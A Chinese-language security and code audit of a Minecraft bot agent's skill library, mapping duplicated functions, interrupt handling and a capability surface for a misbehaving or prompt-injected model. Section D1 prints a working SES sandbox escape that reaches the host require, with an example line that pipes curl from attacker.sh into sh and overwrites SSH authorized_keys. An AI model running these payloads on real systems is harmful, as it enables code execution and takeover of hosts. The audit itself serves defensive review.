# 深读①：skills.js / atom_* / act_* / strat_obtain / flow_mine

第二轮深读。目标是把第一轮审计①自报「没读」的洞补上，重点是 **SES 沙箱到底挡不挡得住**、**98 个导出的完整分叉表**、以及 `digTunnel` 周边同类缺陷。

**未改任何源码。** 所有行号均为实际读到的行。

---

## 0. 覆盖表（先说清楚哪里读了、哪里没读）

| 文件 | 行数 | 覆盖程度 | 说明 |
|---|---:|---|---|
| `src/agent/coder.js` | 228 | **已全文读**（1-200 + 200-228） | SES 沙箱的接线点 |
| `src/agent/library/lockdown.js` | 32 | **已全文读** | `evalTaming` 配置 |
| `src/agent/library/skills.js` | 5819 | **约 2400 行逐行读**（1-1320、1413-1562、3899-4103 全文；其余按导出表 + 定点抽查）—— **不是全文** | 见 §1 结构图；未读段落在 §1.1 逐条列出 |
| `atom_wait.js` | 87 | **已全文读** | `waitUntil` 语义分叉 |
| `act_items.js` | 140 | **已全文读** | equip/eat/dropItem |
| `atom_input_misc.js` | 158 | 读 23-112（`command`/`checkCommand`/`say`/`whisper` 开头） | 斜杠命令唯一出口 |
| `atom_dig` / `atom_step`(act_step) / `query_perceive` / `query_safe` / `query_stuck` / `query_classify` | — | **第一轮已全文读** | 本次复用，不重复读 |
| **`act_dig.js`** | 256 | **已全文读**（1-139 第一轮 + 140-256 本轮） | 为回答 t10 的 E9；见 §3.5 |
| `act_pillar.js` | 129 | grep 定位（`interrupt_code` 在 48/82） | 只为回答"`stepUp` 停得停不下来" |
| `flow_mine.js` | 495 | **读 60-119、256-495**（emit 出 `mine()` 全程 + `oreNames` + `ORE_DROP`） | 见 D6 |
| `strat_obtain.js` | 917 | **只读 250-344**（`planObtain` 开头）+ 导出表 + catch 扫描 | **未全文读**；结论仅限"这段写得对" |
| 其余 `atom_*`(8) / `act_*`(13) / `query_*`(6) / `scaffold_cleanup` / `tool_prep` | ~4300 | **只读导出表（含行号）+ 定点 grep** | 分叉表里属于这部分的「差异点」列已标 ⚠️=未逐行核对 |

**这张表的作用**：本报告里凡是标「已核实」的结论都读到过原文；标 ⚠️ 的是从函数签名/常量/trace 推断的，**不能当定论用**。第一轮的教训是"申报没读"比"假装读完"值钱，所以这里照做。

---

## 1. `skills.js` 段落结构图（每 ~500 行在做什么）

用 `grep -n "^export \(async \)\?function"` 得到的**完整**导出表（98 个）反推，每一段的主题如下。行号是真实行号。

| 行段 | 主题 | 段内导出（行号） |
|---|---|---|
| 1-30 | 头部 import + 全局常量 | — |
| 33-171 | 通用小工具 | `waitUntil`(39) `checkItems`(74) `log`(103) `facingName`(112) `ensureNearbyBlock`(122) |
| 173-310 | 合成 / 等待（含内部 helper `autoLight`(173) `equipHighestAttack`(186)） | `craftRecipe`(198) `wait`(287) |
| 311-530 | 熔炉族（状态/填料/等待/取出）+ 窗口有效性 + mode 开关 | `checkWindow`(372) `furnaceStatus`(386) `modesIsOn`(420) `modesUnpause`(425) `modesPause`(430) `loadFurnace`(439) `waitForSmelt`(486) `takeFromFurnace`(507) |
| 532-700 | 熔炼全流程 + 清空熔炉 + 战斗入口 | `smeltItem`(532) `clearNearestFurnace`(657) `attackNearest`(695) |
| 700-1005 | 战斗 + 采集 + 捡物 | `attackEntity`(716) `defendSelf`(753) `collectBlock`(800) `pickupNearbyItems`(944) |
| 1007-1330 | **破坏性/放置/装备/丢弃** | `breakBlockAt`(1007) `placeBlock`(1082) `equip`(1285) |
| 1333-1660 | 箱子族 + 进食 + 给玩家 + 两个导航 helper（`openKnownChest`(1382) `gotoWithTimeout`(1624)） | `discard`(1333) `putInChest`(1413) `takeFromChest`(1449) `viewChest`(1495) `consume`(1524) `giveToPlayer`(1545) |
| 1669-1900 | **movements 构造**（`buildMovements`(1669)，第二份）+ 导航主力 | `goToGoal`(1734) |
| 1897-2240 | 距离/够得着 + 移动族 | `eyePosition`(1897) `reachDistanceTo`(1903) `canReach`(1911) `goToPosition`(1915) `goToNearestBlock`(1970) `goToNearestEntity`(2007) `goToPlayer`(2027) `moveAway`(2117) `moveAwayFromEntity`(2156) `avoidEnemies`(2171) `stay`(2201) `useDoor`(2233) |
| 2312-2670 | 睡觉 / 农业 / 方块交互 / 村民交易 | `goToBed`(2312) `tillAndSow`(2344) `activateNearestBlock`(2421) `showVillagerTrades`(2509) `tradeWithVillager`(2548) |
| 2675-2890 | 向下挖 / 回地表 / 用工具 / 不破坏地放置 | `digDown`(2675) `goToSurface`(2733) `useToolOn`(2752) `placeBlockWithoutBreaking`(2886) |
| 2900-3600 | **建造族**（含 `stashUnneeded`(3075) 等 6 个内部 helper） | `prepareForBuilding`(3105) `fillAreaSafely`(3190) `findFlatBuildingSpot`(3223) `findBuildingSite`(3285) `levelGround`(3390) `prepareBuildingSite`(3493) `buildHouse`(3517) |
| 3594-3900 | 盘点 / 报告 / 地标 / 死亡恢复 | `surveyInventory`(3594) `makeRoomForBot`(3652) `reportStatus`(3694) `listKnownSites`(3726) `recordDeath`(3787) `recoverDeathItems`(3813) |
| 3899-4100 | **蓝图族**（唯一碰文件系统的出口） | `buildFromSchematic`(3899) `describeSchematic`(4039) `listBlueprints`(4064) |
| 4104-4600 | **仓储族**（11 个导出 + 8 个 helper，`WAREHOUSE` 常量在 4607） | `setupStorage`(4104) `createStorageChests`(4126) `storeItem`(4150) `findItemInStorage`(4235) `tidyInventory`(4282) `listStorage`(4326) `checkLoadout`(4377) `planMaterials`(4448) `guardInventory`(4550) |
| 4607-5130 | 仓储建造（4 个） | `findStorageSite`(4761) `buildStorageRoom`(4816) `fillRoomWithChests`(4924) `buildStorageWarehouse`(5020) `verifyChest`(5060) |
| 5132-5380 | 危险记忆 / 安全判定 / 任务进度持久化 | `markDanger`(5132) `isSafeHere`(5173) `recordTaskProgress`(5242) `resumeTask`(5269) `clearTask`(5306) `resetHazardCache`(5341) |
| 5402-5690 | **地形查询 / 规划 / 攀爬 / 跟随** | `surveyArea`(5402) `planRoute`(5466) `climbLadder`(5611) `canClimbHere`(5637) `followEntity`(5662) |
| 5690-5819 | 掘进 / 树 | `digTunnel`(5690) `scanTreeAt`(5753) `planTreeChop`(5787) |

**一句话概括这张图**：`skills.js` 是**按功能域平铺的 98 个函数**，每个域（熔炉/箱子/建造/仓储/蓝图）都自成一套完整实现，**没有一层是"薄转发到原子层"**——只有 `craftRecipe`/`smeltItem`/`consume`/`followEntity`/`digTunnel`/`scanTreeAt`/`planTreeChop`/`isSafeHere` 这 8 个是转发或半转发，其余 90 个是独立实现。这就是分叉表能长达 40+ 行的原因。

### 1.1 我没逐行读的段落（诚实清单）

`310-1330`（熔炉族细节、战斗、采集、放置）、`1333-1413`、`1560-3900`（移动/农业/交易/建造/仓储的绝大部分）、`4104-5400`（仓储族）、`5620-5819`（攀爬/树）。
这些段落的**存在与边界**由导出表确定（上表），但**函数体内部逻辑**只做了定点抽查与 grep。凡涉及它们的结论，我在分叉表里标了 ⚠️。

---

## 2. A：98 个导出的分叉总表

规则：**"分叉"= 同一件事在两处各有一份实现**。只要模型能选，就有两个答案。第二列是 skills.js 行号，第三列是原子/动作层对应物。

| # | 导出（skills.js 行） | 对应实现 | 差异点 | 模型看得见哪边 |
|---|---|---|---|---|
| 1 | `waitUntil`(39) | `atom_wait.waitUntil`(38) | **已核实：`false` 语义相反**。skills 版只有 `predicate()` 为真才算成立（`skills.js:59`），atom 版把 `false` 当**完成**（`atom_wait.js:67`，且文件头 10-12 行明写"把 false 当还没完成"是**被修掉的 bug**）。返回形状也不同（`{ok,waitedMs,reason,label}` vs ActionResult） | skills 版在 `always_show_skills` 白名单里（`skill_library.js:43`），**模型默认看到并会用错的那一份** |
| 2 | `checkItems`(74) | — （`query_perceive.countItem` 只是底层） | 唯一实现，无分叉 | — |
| 3 | `log`(103) | `outcome.logLine` | 薄转发，无分叉 | — |
| 4 | `facingName`(112) | `world_model.facingOf` | 薄转发 | — |
| 5 | `ensureNearbyBlock`(122) | `act_place.placeBlockAt`(47) | ⚠️ 内部自己拼"找方块→找空位→placeBlock"，与 act_place 的放置语义两套 | 只有 skills |
| 6 | `craftRecipe`(198) | `act_craft.craftOnce`(34) | 已核实：**真转发**（`skills.js:255`），保留 boolean 外壳 + 放/收工作台流程 | — |
| 7 | `wait`(287) | `atom_wait.waitUntil` | ⚠️ 手写忙等循环（`skills.js:300-308`），与 atom_wait 并行存在；但它自带 interrupt 检查，行为可接受 | 只有 skills |
| 8 | `checkWindow`(372) | `act_container.assertUsableWindow`(337) | ⚠️ 同一规则"窗口还在不在"两份：skills 版比较 `bot.currentWindow !== win`（`skills.js:376`），act 版叫 assert 并抛/返回码 | 两份都在（skills 版被 loadFurnace/smeltItem 用） |
| 9 | `furnaceStatus`(386) | — | 唯一 | — |
| 10 | `modesIsOn/Unpause/Pause`(420/425/430) | `modes.js` 本体 | 访问器包装（为兼容无 modes 的假 bot），无分叉 | — |
| 11 | **`loadFurnace`(439)** | **`act_craft.furnaceLoad`(483)** | **已核实：skills 版 `furnace.putInput` 无条件执行（`skills.js:478`），不看输入槽里有没有别人的东西**；act 版按 `skills.js:599-602` 的注释 "开窗后读一次输入槽，别人的料就返回 OCCUPIED" | **两份都在，模型可调 skills 版 → 覆盖别人的熔炼料** |
| 12 | `waitForSmelt`(486) | — | 内部用 skills.waitUntil，因此继承 #1 的 false 语义 | — |
| 13 | `takeFromFurnace`(507) | `act_craft.furnaceCollect`(549) | ⚠️ 两处都能取产物 | — |
| 14 | `smeltItem`(532) | `flow_smelt` / `act_craft.furnaceLoad+Collect` | 已核实：**真转发**（`skills.js:611/624`） | — |
| 15 | `clearNearestFurnace`(657) | — | 唯一；会 `takeInput/takeFuel` 清空别人的熔炉（见越权表） | — |
| 16 | `attackNearest`(695) | `act_attack.nearestAttackable`(156) | ⚠️ 两套选目标 | — |
| 17 | **`attackEntity`(716)** | **`act_attack.attackEntity`(58)** | ⚠️ **同名不同实现**：skills 版走 `bot.pvp.attack(entity)` + 轮询（`skills.js:738-746`）；act 版有 `ATTACK_COOLDOWN_MS=625`（`act_attack.js:175`）自己管节奏 | 两份都在 |
| 18 | `defendSelf`(753) | `act_attack` | ⚠️ skills 版自己 `setMovements(new pf.Movements(bot))`（`:770/776`）并 gotoWithTimeout | — |
| 19 | `collectBlock`(800) | `flow_collect.collect` / `flow_mine.mine` | 已核实：完全独立的一套"找→走→挖→捡"（`:836-939`），用 `bot.collectBlock.collect` 插件；**不查 interrupt 以外没有进度校验**，失败只 `continue` | 三份都在（模型可挑） |
| 20 | `pickupNearbyItems`(944) | `flow_pickup.collectDrops` | ⚠️ 两套"走过去捡"；skills 版无 withNav 闸 | — |
| 21 | **`breakBlockAt`(1007)** | **`act_dig.digBlock`(30)** | **已核实（第一轮）**：不查 `bot.interrupt_code`；距离判据 `4.5`（`:1034`）vs `5.1`（`act_dig.js:36`）；**无玩家建筑保护**（digBlock 也没有，但 digBlock 有 interrupt/站稳检查） | 两份都在 |
| 22 | **`placeBlock`(1082)** | `act_place.placeBlockAt`(47) | ⚠️ skills 版自带"目标已有玩家建筑就拒绝"（`:1190-1195`，用 `wmIsPlayerBuilt`），**这可能反而是不重复的那一份**——需要核对 act_place 是否也有 | 两份都在 |
| 23 | **`equip`(1285)** | **`act_items.equip`(50)** | **已核实**：skills 版**不查 interrupt、不校验槽名、不验证是否真戴上**（`:1311-1328` 直接 `bot.equip`）；act 版查 interrupt（`:51`）、白名单槽（`:52`）、读回验证（`:64-72`，`verified` 字段） | 两份都在 |
| 24 | `discard`(1333) | `act_items.dropItem`(130) | ⚠️ 两套丢弃：skills 版循环丢到 num/-1 + 失败 3 次退出；act 版单次 + 返回 `{dropped,left}` | — |
| 25 | **`putInChest`(1413)** | **`act_container.deposit`(351)** | **已核实**：skills 版直接 `opened.container.deposit(...)`（`:1437`），**不校验窗口、不核对背包是否真的少了** | 两份都在 |
| 26 | **`takeFromChest`(1449)** | **`act_container.withdraw`(416)** | **已核实（重要）**：skills 版 `totalTaken += toTakeFromSlot`（`:1486`）是**按"打算取多少"累加**，不看背包实际增量 → 窗口中途关掉也返回 `true`（`:1492` `totalTaken > 0`） | 两份都在 |
| 27 | `viewChest`(1495) | `act_container.windowItems`(184) | ⚠️ 两套读箱子 | — |
| 28 | `consume`(1524) | `act_items.eat`(92) | 已核实：**真转发**（`:1535`）。注意 act_items 文件头（`:6-7`）说"旧 consume 不看饱食度"是**历史**，当前已修 —— 这条不算分叉 | — |
| 29 | `giveToPlayer`(1545) | — | 唯一；`/tp` + toss | — |
| 30 | `goToGoal`(1734) | `nav_core.goTo`(179) | ⚠️ 两套导航入口；skills 版直驱 pathfinder（绕过第一轮 N2 的闸） | — |
| 31 | `eyePosition`(1897) | `atom_read.eyePosition`(41) | ⚠️ 同名，skills 版自己算 | — |
| 32 | `reachDistanceTo`(1903) | `query_perceive.reachDistanceTo`(58) | ⚠️ 同名两份 | — |
| 33 | **`canReach`(1911)** | **`query_perceive.canReach`(73)** | **已核实：默认阈值不同** —— skills `max = 4.3`（`:1911`），query_perceive `max = 5.1`（`query_perceive.js:73`） | 两份都在 |
| 34 | `goToPosition`(1915) | `nav_core.goTo` | ⚠️ 同 #30 | — |
| 35 | `goToNearestBlock`(1970) | — | 唯一 | — |
| 36 | `goToNearestEntity`(2007) | — | 唯一 | — |
| 37 | **`goToPlayer`(2027)** | `flow_follow.followEntity` | ⚠️ skills 版**用 `/tp @s <username>`**（`:2045`）瞬移到玩家身上 —— 语义与"跟随"完全不同 | — |
| 38 | `moveAway`(2117) | `flow_escape` | ⚠️ | — |
| 39 | `moveAwayFromEntity`(2156) | `flow_escape` | ⚠️ | — |
| 40 | `avoidEnemies`(2171) | `flow_escape` | ⚠️ | — |
| 41 | `stay`(2201) | — | 唯一 | — |
| 42 | `useDoor`(2233) | `act_blockuse.toggleBlock`(48) | ⚠️ 两套开关门 | — |
| 43 | `goToBed`(2312) | `act_rest.sleepInBed`(44) | ⚠️ | — |
| 44 | `tillAndSow`(2344) | `act_farm.tillSoil/plantSeed`(158/85) | ⚠️ skills 版把三件事写在一起 | — |
| 45 | `activateNearestBlock`(2421) | `act_blockuse.toggleBlock` | ⚠️ | — |
| 46 | `showVillagerTrades`(2509) | — | 唯一 | — |
| 47 | `tradeWithVillager`(2548) | `act_entity.tradeOnce`(90) | ⚠️ 两套交易 | — |
| 48 | `digDown`(2675) | `act_dig` + `executor` 的 digdown 分支 | ⚠️ 第三份"往下挖" | — |
| 49 | `goToSurface`(2733) | — | 唯一 | — |
| 50 | `useToolOn`(2752) | `act_blockuse`/`act_items` | ⚠️ | — |
| 51 | `placeBlockWithoutBreaking`(2886) | `act_place.placeBlockAt` | ⚠️ 名字就说明它是"不破坏版"，与 placeBlock 成对 | — |
| 52 | `prepareForBuilding`(3105) | `flow_build` | ⚠️ 四份建造流程之一 | — |
| 53 | `fillAreaSafely`(3190) | `flow_build` | ⚠️ 有 `/fill` 版本在 `levelGround` | — |
| 54 | `findFlatBuildingSpot`(3223) | — | 唯一 | — |
| 55 | `findBuildingSite`(3285) | — | 唯一 | — |
| 56 | `levelGround`(3390) | `flow_build` | ⚠️ 用 `/fill ... replace`（`:3421`）+ `keep`（`:3433`）大范围改地形 | — |
| 57 | `prepareBuildingSite`(3493) | — | 唯一 | — |
| 58 | `buildHouse`(3517) | `flow_build` | ⚠️ 体积由模型给（width×depth×height），无上限 | — |
| 59 | `surveyInventory`(3594) | `query_perceive.inventory`(115) | ⚠️ 两套盘点 | — |
| 60 | `makeRoomForBot`(3652) | — | 唯一 | — |
| 61 | `reportStatus`(3694) | — | 唯一 | — |
| 62 | `listKnownSites`(3726) | `landmarks` | ⚠️ | — |
| 63 | `recordDeath`(3787) | `control.onDeath` | ⚠️ 两套死亡记录 | — |
| 64 | `recoverDeathItems`(3813) | `flow_pickup` | ⚠️ | — |
| 65 | `buildFromSchematic`(3899) | — | 唯一（但直连 `bot.chat`，见 D3） | — |
| 66 | `describeSchematic`(4039) | — | 唯一 | — |
| 67 | `listBlueprints`(4064) | — | 唯一 | — |
| 68-78 | 仓储族 11 个（4104-4600） | `flow_store` / `landmarks` / `storage.js` | ⚠️ 与 `flow_store`（板库 shared）**两套箱子真相**（第一轮 S7 已记） | — |
| 79-83 | 仓储建造 5 个（4761-5060） | — | 唯一（但都会大范围放方块） | — |
| 84 | **`markDanger`(5132)** | `world_model` 危险点 | ⚠️ 写 JSON（与板库两套真相的一支） | — |
| 85 | **`isSafeHere`(5173)** | **`query_safe.isSafe`(60)** | **已核实（第一轮）**：敌对生物上限硬编码 1（`:5229-5231` 只取一个）vs 全数（`query_safe.js:142-153`）；`mc.isHostile` vs 自己的 `HOSTILE` 集合（多 `breeze`/`bogged`） | 两份都在 |
| 86 | `recordTaskProgress`(5242) | `board_store` | ⚠️ 自己写 `store` JSON 的 tasks（第二套任务持久化） | — |
| 87 | `resumeTask`(5269) | — | 唯一 | — |
| 88 | `clearTask`(5306) | — | 唯一 | — |
| 89 | `resetHazardCache`(5341) | `world_model` | ⚠️ | — |
| 90 | `surveyArea`(5402) | `map_query.mapSummary` | ⚠️ 两套"看周围"；skills 版默认 r=64（第一轮 N1，已降级） | — |
| 91 | `planRoute`(5466) | `path_3d.plan3D` | 半转发（自己算 aim 再调 plan3D） | — |
| 92 | `climbLadder`(5611) | `act_climb.climbUp`(150) | ⚠️ 两套爬梯 | — |
| 93 | `canClimbHere`(5637) | `act_climb.isClimbable`(64) | ⚠️ | — |
| 94 | `followEntity`(5662) | `flow_follow.followEntity` | 已核实：真转发 | — |
| 95 | **`digTunnel`(5690)** | `atom_tunnel.tunnelStep`(211) | 半转发 + **`ok` 未 import（D2）** | — |
| 96 | `scanTreeAt`(5753) | `query_tree` | 真转发 | — |
| 97 | `planTreeChop`(5787) | `query_tree.planFence`→`planFelling` | 真转发 | — |
| 98 | （`WAREHOUSE` 常量 4607） | — | 非函数 | — |

**统计**：98 个导出中，**8 个是真转发/半转发**（craftRecipe、smeltItem、consume、giveToPlayer 部分、planRoute、followEntity、digTunnel、scanTreeAt、planTreeChop），**约 45 个有原子/动作层对应物且是独立实现**，其余约 45 个是唯一实现。
**其中「同一规则两个不同答案」已逐行核实的 7 条**：#1 waitUntil(false 语义相反)、#11 loadFurnace(无 OCCUPIED 检查)、#21 breakBlockAt(无 interrupt、4.5 vs 5.1)、#23 equip(无校验)、#26 takeFromChest(按意图计数)、#33 canReach(4.3 vs 5.1)、#85 isSafeHere(敌对生物上限 1)。
第一轮只报了 3 条（#21、#85、以及 #21 的距离差），**本轮新增 4 条**（#1、#11、#23、#26、#33 里的 4 个新条目）。

---

## 3. B：越权能力面（模型恶意或幻觉时能做什么）

前提（`coder.js:189-194`）：模型生成的代码运行在 SES `Compartment` 里，注入的四个 endowment 是 `{ skills, log, world, Vec3 }`。**整个 skills 模块（98 个导出）+ 整个 world 模块都在里面。**

### D1（Must fix）SES 沙箱可以被三行代码逃逸 —— 拿到宿主 `require`，等于任意代码执行
`src/agent/library/lockdown.js:20`（`evalTaming: 'unsafeEval'`）、`:24-31`（`makeCompartment`）、`src/agent/coder.js:189-194`（endowments）

**这是什么**：`lockdown()` 把 SES 的 `evalTaming` 设成 `'unsafeEval'`（注释说是因为 mineflayer 的 protodef 依赖 eval），然后 `makeCompartment` 把**宿主对象** `skills` / `world` 塞进 compartment 作 endowment。`coder.js:188` 自己也写了一句 "Note that the code may be able to modify the exposed objects"。

**问题（实测，不是推断）**：endowment 是**宿主**对象，所以它的 `.constructor` 是**宿主的 `Function`**（不是 compartment 里的那个）。我用仓库自己的 `lockdown.js` 跑了一遍：

```
$ node -e "import('./src/agent/library/lockdown.js').then(m=>{m.lockdown();const c=m.makeCompartment({skills:{log:function(){}},world:{}});
  console.log(c.evaluate('skills.log.constructor(\"return typeof process\")()'));
  console.log(c.evaluate('world.constructor.constructor(\"return typeof require\")()'));})"
object          ← 宿主的 process 可达
function        ← 宿主的 require 可达
```
对照：compartment 内部的 `new Function('return typeof process')()` 返回 `undefined`（说明 SES 对"compartment 自己的 Function"是管用的），**唯一破口就是 endowment 的原型链**。

于是模型只要写出：
```js
const req = world.constructor.constructor('return require')();
req('child_process').exec('curl attacker.sh | sh');
req('fs').writeFileSync('C:/Users/zeh/.ssh/authorized_keys', '...');
```
就能做**任意代码执行 / 任意文件读写 / 任意网络**。`allow_insecure_coding` 默认是 `true`（第一轮第 1 条），`!newAction` 又是 owner 级命令 —— 也就是说这条链在默认配置下是**通的**。

**最小修复**（三选一，按代价排）：
1. **最省事**：`lockdown.js` 里把 endowment 换成**冻结的 facade**——只传函数引用并 `Object.freeze` 一层不含原型链的包装，例如 `makeCompartment({ skills: Object.freeze({ log: (...a)=>skills.log(...a), ...仅需要的几个 }) })`。注意：这只堵住"从 endowment 摸到宿主 Function"，仍不是真隔离。
2. 把 `evalTaming` 改回 `safeEval`（默认），然后给 protodef 打补丁或换掉它 —— 这是**唯一能真正关掉**的办法。
3. 承认它不是沙箱：把 `!newAction` 变成显式危险开关（默认关），并在 README 里写明"这里的沙箱不是安全边界"。

**不修会怎样**：第一轮报的"控制面零认证"（socket 谁都能冒充 owner）只是**入口**；即使把认证补好，只要模型被提示注入（玩家聊天就能做到）或幻觉，就能直接 `require('child_process')`。**这不是"理论纵深"，是 3 行可复现的逃逸。**

### D2 越权能力面排序（模型写什么 → 造成什么）

按"破坏力 × 触发容易度"排序。全部为已核实存在的能力（行号真实）。

| 序 | 能力 | 模型怎么写 | 后果 |
|---|---|---|---|
| 1 | **沙箱逃逸** | `world.constructor.constructor('return require')()('child_process').exec(...)` | 见 D1：RCE、读写任意文件、外联。**唯一一条不需要任何 op 权限的** |
| 2 | **直发任意斜杠命令** | `skills.buildFromSchematic(...)` 走 `bot.chat(cmd)`（`skills.js:3998-4000`），**cmd 是变量**，绕过 `atom_input_misc.command()` 的白名单 | 命令白名单（`permissions.SLASH_COMMANDS`）被整条绕过；且这条 `bot.chat` 连 preflight 的 `slash-command-owner` 正则都看不见（正则要求字面量 `/`，见第一轮 S22 的预测，这里是**实例**） |
| 3 | **大范围改地形/拆建筑** | `skills.levelGround(bot,x,z,size)` → `/fill ... replace` + `/fill ... keep`（`:3421/3433`）；`skills.buildFromSchematic(...,{overwrite:true})` → 每个方块 `/setblock`（`:3998`，`maxBlocks` 上限在 `overwrite` 时不生效，`:3940`） | 一栋玩家建筑几十秒内被覆写；`overwrite=true` 还把"拒绝覆盖玩家建筑"的闸（`:3973`）关掉 |
| 4 | **逐块拆除（绕过建筑保护）** | `for(...) await skills.breakBlockAt(bot,x,y,z)` | `breakBlockAt`(:1007) **既没有 `wmIsPlayerBuilt` 保护、也没有 `bot.interrupt_code` 检查** —— 只有 `placeBlock` 有保护（`:1190`）。模型可以"拆掉玩家房子"而不触发任何拒绝 |
| 5 | **关掉自己的安全行为** | `skills.modesPause(bot,'self_preservation')` / `'cowardice'`（`:430` 导出，`:705` 内部就这么用） | 让 bot 不再躲避岩浆/坠落/敌对生物 → 自杀式行为（白丢装备与位置）。这是**安全模式的反向开关直接暴露给模型** |
| 6 | **清空别人的熔炉** | `skills.clearNearestFurnace(bot)`（`:657`，`takeInput/takeFuel/takeOutput`） | 拿走别人正在炼的料（`:681-684`） |
| 7 | **读文件系统** | `skills.describeSchematic(bot, '../../settings.js')` / `listBlueprints('C:/Users')` | `schematicFile` 与 `dir` **都没做路径校验**（`:3930`/`:4051`/`:4074`）→ 目录枚举 + 任意路径读取尝试（`readLitematic` 在 `schematic.js`，用 `fs`）。至少是存在性 oracle + 错误信息泄露 |
| 8 | **瞬移 / 绑定玩家** | `skills.goToPlayer(bot,'某人')` → `/tp @s <username>`（`:2045`）；`skills.goToPosition` → `/tp @s x y z`（`:1934`）；`moveAway`(`:2139`) | 这些走 `command(...,{cheat:true})` → 过 permissions 表（好），但模型可以让 bot 瞬移到任意处、离开工作区、跟丢玩家 |
| 9 | **丢光背包** | `skills.discard(bot,'diamond')` / `giveToPlayer` | 不可逆的物资损失 |
| 10 | **无限占用（软 DoS）** | `await skills.wait(bot, 10**9)`（`:287`，纯忙等）；`buildHouse(w,d,h)` 体积无上限（`:3517`）；`levelGround(...,maxOps=4000)` 打满；`fillAreaSafely` 区域任意 | 占住动作槽数小时，任务板看这张单永远 running（与第一轮 B3/B4 叠加） |
| 11 | **改自己的持久化状态** | `skills.clearTask(bot,id)` / `recordTaskProgress` / `markDanger` / `resetHazardCache` | 抹掉任务进度、伪造危险区（让规划永远绕开某地） |

**结论**：即使 D1 修好（假设能用 safeEval 真隔离），第 2/3/4/5/6 条仍然成立 —— 因为这五个是**合法 API 的正常用法**，只是没人限制"模型能调它们"。所以 `!newAction` 的正确姿态是**当成"给模型的 root"，而不是"沙箱里的受限脚本"**。

### 3.5 「失控面」：玩家按了 `!stop` 之后，哪些动作真的停不下来（含 t10 的 E9 定性）

t10 在 `executor.js` 发现"两个挖方块循环自身不查 `interrupt_code`"，并列为待定性项 E9（要读 `act_dig.js` 才能判）。**我读完 `act_dig.js` 全文（1-256）后的结论是：E9 不成立 —— `dig` 停得下来，而且是三层都查。** 逐个回答：

**① 这两个循环实际调什么？** 都走 `act_dig.digBlock`，不直连 `bot.dig()`：
- `executor.js:251` — 同列/邻列挖掘：`await digBlock(bot, { kind:'block', pos:{ x:bx, y:cellY, z:bz } })`
- `executor.js:351` — 向下挖：`await digBlock(bot, { kind:'block', pos:{ x:bx, y:y-1, z:bz } })`
- `executor.js:634/648` — 落点修正时的补挖：同样 `digBlock`。
`executor.js` 里出现 `bot.dig` 的地方**一处都没有**（第一轮 t6 已经把 skills.js 的裸 `bot.dig` 全部收进 `atom_input_mouse.holdDig`）。

**② `act_dig.js` 内部查不查？** 查，三层：
1. **入口**：`act_dig.js:38` `if (bot.interrupt_code) return fail('INTERRUPTED', '被取消了');` —— 每次 `digBlock` 一开始就判。
2. **挖掘过程中**：`act_dig.js:121` `await holdDig(bot, block, { digTimeMs: digMs })`，而 `atom_input_mouse.js:266` 每 `min(100ms, 剩余)` 醒一次、`:269` `if (bot?.interrupt_code) { interrupted = true; break; }` —— 也就是说**最多 100 毫秒**就会中止按住鼠标。
3. **挖后校验**：`act_dig.js:134-138` 的 `waitUntil(..., { timeoutMs: verifyMs, intervalMs: 80, bot })` 传了 `bot`，所以它也响应中断（`atom_wait.js:43` 的 `interruptible = !!bot`），并在 `:140` 把 `INTERRUPTED` 原样返回。
→ 所以 executor 的两个循环"自身不查"属于**上层重复检查的省略**，可接受：最坏情况是当前这一格挖完（≤ 一次 dig 预算）才退出。
顺带确认同类：`act_pillar.js:48` 入口查、`:82` 循环内查，所以 `stepUp` 也停得下来。

**③ `act_dig` 的返回值语义，有没有 executor.js:240-245 批评的那种"液体头顶假成功"？** 没有 —— 它做的是**正向验证**，正好是那个批评的反面：
- 成功：`return ok({ dugBlock, pos, costMs })`（`:144`）——**前提是** `:134` 的 `waitUntil` 观察到该格真的变成 `air`/`cave_air`。
- 挖了但没消失：`fail('TIMEOUT', '挖了但 X 还在')`（`:141`）—— 不谎报。
- 其它码：`NO_TARGET`（无方块/不可挖 `:46-47`）、`BLOCKED`（悬空，`:78`）、`OUT_OF_REACH`（`:90`）、`NO_TOOL`（`:100`）、`INTERRUPTED`、`INTERNAL`。
- 检查工具是否够：`canDigReason` 三态（`can/no-tool/unreadable`，`:189-256`），把"背包读不到"与"真没工具"分开 —— 这是这套代码里做得最好的一处。
对比 `executor.js:240-245` 批评的那段（`dig` 循环里 `liquidBlocked` 后 `break` 仍 `return ok`）：**那是 executor 的问题，不是 act_dig 的**；`act_dig` 本身没有同类问题。

**④ `act_dig` 里有没有 `ok` 未 import 那种"返回值构造用了未定义标识符"？** 没有。`act_dig.js:8` `import { ok, fail, normalizeTarget } from './contract.js';` —— 三个符号都真的导入了，且全文用的就是这三个。**`skills.js:5750` 的 `ok` 未 import 是个例，`act_dig` 干净。**

**合并结论（这是 t10 想要的"第二个面"的准确形状）**：`dig` **不是**第二个面。真正"停不下来 / 永不超时"的只有两处，且都是**缺陷**而非设计：

| 失控点 | 证据 | 玩家按 `!stop` 后的实际行为 |
|---|---|---|
| **`follow` 的超时参数根本没接上** | `composite_registry.js:78` 传的是 `deadlineMs: remaining(ctx)`，而 `flow_follow.js:87` 解构的名字是 `timeoutMs = -1` → **`deadlineMs` 被当成未知字段丢掉**，`timeoutMs` 保持 -1（文件注释 `:83` 自己写"`timeoutMs` -1 表示一直跟"） | 跟随**永不超时**，`!do follow` 可以一直跑到进程被杀。**t10 的发现，我独立复核了这两行，确认成立** |
| **任务板单的 `!stop` 断链** | 第一轮第 6 条（`board_scheduler.js:655` 绕过 `runJobAction`；`action_manager.js:91` `executing=false` 不发中断） | 单子照旧做完；连"停手"都不会发生 |

而 `dig`/`stepUp`/`wait`/`breakBlockAt` 这类**每次动作**都在 100ms 粒度上响应中断（`skills.wait` 在 `:301` 也查），所以它们只在"循环的两次迭代之间"有 ≤1 次动作的延迟。**因此"机器人一进长动作玩家就完全失控"这个描述，只对 `follow` 成立；写进主报告时不要把 dig 也算进去，否则会被一条演示（按住 `!stop` 挖矿会停）当场推翻。**

> 附带一条 t10 提醒的交叉验证结果：`skills.js` 的建造族（`buildHouse`/`levelGround`/`fillAreaSafely`/`buildFromSchematic`/`prepareForBuilding`）在 `tasks/` 与 `tools/` 里的引用**都是 0**（`grep -rl` 实测），`tasks/construction_tasks/` 下也没有任何 `.js` 调 `skills.*` 或生成 `setblock`（该目录是 `.py` 过滤器 + 蓝图 + 生成器脚本）。所以**两边没有可证的重复实现**，但也**不能因此判它们是死代码**——它们是模型可见技能（`buildHouse` 另有 2 处 src 内引用）。

---

## 4. 新发现清单（第一轮 18 条之外）

## Must fix

### D1 SES 沙箱 3 行可逃逸（见 §3，已实测）
